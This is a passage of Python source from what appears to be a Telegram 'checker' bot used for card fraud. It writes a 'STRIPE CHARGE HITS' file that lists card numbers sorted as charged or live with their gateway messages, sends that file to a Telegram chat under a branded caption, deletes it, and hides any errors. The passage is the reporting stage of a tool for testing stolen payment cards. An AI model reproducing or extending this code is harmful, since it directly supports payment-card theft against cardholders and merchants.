                    await hf.write(f"=== STRIPE CHARGE HITS | {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
                    if results['charged']:
                        await hf.write(f"💎 CHARGED ({len(results['charged'])})\n")
                        for r in results['charged']:
                            await hf.write(f"{r['card']} | {r['message']}\n")
                        await hf.write('\n')
                    if results['live']:
                        await hf.write(f"🔥 LIVE ({len(results['live'])})\n")
                        for r in results['live']:
                            await hf.write(f"{r['card']} | {r['message']}\n")
                await bot.send_file(
                    chat_id, hits_path,
                    caption=(f"🎯 <b>Hits File</b>  ▸  {len(results['charged'])} Charged  +  {len(results['live'])} Live\n"
                             f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'),
                    parse_mode='html'
                )
                os.remove(hits_path)
            except Exception:
                pass
